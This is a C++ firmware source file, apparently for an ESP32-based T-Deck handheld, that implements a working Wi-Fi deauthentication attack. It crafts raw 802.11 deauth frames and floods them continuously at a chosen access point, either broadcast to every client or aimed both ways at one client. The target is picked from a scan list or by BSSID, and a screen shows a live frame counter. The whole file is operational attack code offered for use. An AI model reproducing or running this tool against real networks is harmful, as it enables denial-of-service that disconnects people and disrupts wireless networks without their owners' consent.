#include "deauth_functions.h"
#include "input_handling.h"
#include "task_manager.h"

extern InputHandling inputHandler;

static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ── task params ───────────────────────────────────────────────────────────────
struct DeauthParams {
    uint8_t           bssid[6];
    uint8_t           client[6];
    bool              directed;
    volatile uint32_t framesSent;
};

// ── helpers (static free functions so the task can call them) ─────────────────
static void buildDeauthFrame(uint8_t* f, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    f[0]=0xC0; f[1]=0x00; f[2]=0x00; f[3]=0x00;
    memcpy(f+4,  da,    6);
    memcpy(f+10, sa,    6);
    memcpy(f+16, bssid, 6);
    f[22]=0x00; f[23]=0x00;
    f[24]=0x07; f[25]=0x00;
}

// ── Core 0 task: only sends frames, no display, no blocking ───────────────────
static void deauthTaskFn(void* p) {
    DeauthParams* params = (DeauthParams*)p;
    uint8_t frame[26];

    while (!TaskManager::stopRequested) {
        for (int i = 0; i < 100 && !TaskManager::stopRequested; i++) {
            if (params->directed) {
                buildDeauthFrame(frame, params->client, params->bssid, params->bssid);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
                buildDeauthFrame(frame, params->bssid, params->client, params->bssid);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
                params->framesSent += 2;
            } else {
                buildDeauthFrame(frame, BROADCAST, params->bssid, params->bssid);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
                params->framesSent++;
            }
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
    TaskManager::taskRunning = false;
    vTaskDelete(nullptr);
}

// ── constructor ───────────────────────────────────────────────────────────────
DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
    : displayManager(displayManager), wifiFunctions(wifiFunctions) {}

// ── helpers ───────────────────────────────────────────────────────────────────
bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]) == 6;
}

String DeauthAttack::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0],m[1],m[2],m[3],m[4],m[5]);
    return String(buf);
}

// ── argument parser ───────────────────────────────────────────────────────────
void DeauthAttack::start(char* args) {
    if (!args || !*args) {
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("Usage:");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("  deauth <index>           (after scanwifi)");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("  deauth <bssid> [ch] [client]");
        displayManager.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first      = strtok(buf,     " ");
    char* channelStr = strtok(nullptr, " ");
    char* clientStr  = strtok(nullptr, " ");

    uint8_t bssid[6];
    int     channel = 6;

    if (strchr(first, ':') == nullptr) {
        // index mode
        int idx = atoi(first);
        if (!wifiFunctions.isScanDone()) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Run scanwifi first.");
            displayManager.printCommandScreen();
            return;
        }
        if (!wifiFunctions.getNetworkInfo(idx, bssid, &channel)) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.printText("Invalid index. Max: ");
            displayManager.println(wifiFunctions.getNetworkCount() - 1);
            displayManager.printCommandScreen();
            return;
        }
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.printText("Target ["); displayManager.printText(idx);
        displayManager.printText("]: ");
        displayManager.setTextColor(TFT_CYAN);
        displayManager.println(macStr(bssid).c_str());
        displayManager.setTextColor(TFT_WHITE);
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.printText("Channel: "); displayManager.println(channel);
        delay(800);
    } else {
        // BSSID mode
        if (!parseMac(first, bssid)) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Invalid BSSID. Format: XX:XX:XX:XX:XX:XX");
            displayManager.printCommandScreen();
            return;
        }
        if (channelStr) { int ch = atoi(channelStr); if (ch >= 1 && ch <= 13) channel = ch; }
    }

    uint8_t clientMac[6];
    bool directed = false;
    if (clientStr && strlen(clientStr) == 17) directed = parseMac(clientStr, clientMac);

    sendDeauthFrames(bssid, directed ? clientMac : BROADCAST, channel, directed);
}

// ── attack: Core 0 sends frames, Core 1 handles UI + keyboard ─────────────────
void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
                                     int channel, bool directed) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    // ── static header (drawn once) ────────────────────────────────────────────
    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(TFT_RED);
    displayManager.println("-- DEAUTH ATTACK --");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("AP:      ");
    displayManager.setTextColor(TFT_CYAN);
    displayManager.println(macStr(bssid).c_str());
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Target:  ");
    displayManager.setTextColor(directed ? TFT_YELLOW : TFT_MAGENTA);
    displayManager.println(directed ? macStr(client).c_str() : "BROADCAST");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Channel: "); displayManager.println(channel);
    if (directed) {
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println("Mode: bidirectional");
        displayManager.setTextColor(TFT_WHITE);
    }
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.setTextColor(TFT_GREEN);
    displayManager.println("Running on Core 0  q=stop");
    displayManager.setTextColor(TFT_WHITE);
    int32_t counterY = displayManager.getCursorY();

    // ── launch task on Core 0 ─────────────────────────────────────────────────
    DeauthParams params;
    memcpy(params.bssid,  bssid,  6);
    memcpy(params.client, client, 6);
    params.directed    = directed;
    params.framesSent  = 0;

    if (!TaskManager::start(deauthTaskFn, "deauth", &params, TASK_STACK_SMALL, 0)) {
        displayManager.println("Task start failed.");
        displayManager.printCommandScreen();
        return;
    }

    // ── Core 1 UI loop: keyboard + live counter ───────────────────────────────
    unsigned long lastUpd = 0;
    while (TaskManager::isRunning()) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') TaskManager::requestStop();

        unsigned long now = millis();
        if (now - lastUpd > 200) {
            displayManager.fillRect(10, counterY, 220, LINE_HEIGHT + 2, TFT_BLACK);
            displayManager.setCursor(10, counterY);
            displayManager.printText("Frames: ");
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println((int)params.framesSent);
            displayManager.setTextColor(TFT_WHITE);
            lastUpd = now;
        }
        delay(10);
    }
    TaskManager::cleanup();

    // ── summary ───────────────────────────────────────────────────────────────
    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(TFT_YELLOW);
    displayManager.println("-- Attack stopped --");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Total frames sent: ");
    displayManager.println((int)params.framesSent);
    delay(2000);
    displayManager.tdeck_begin();
}
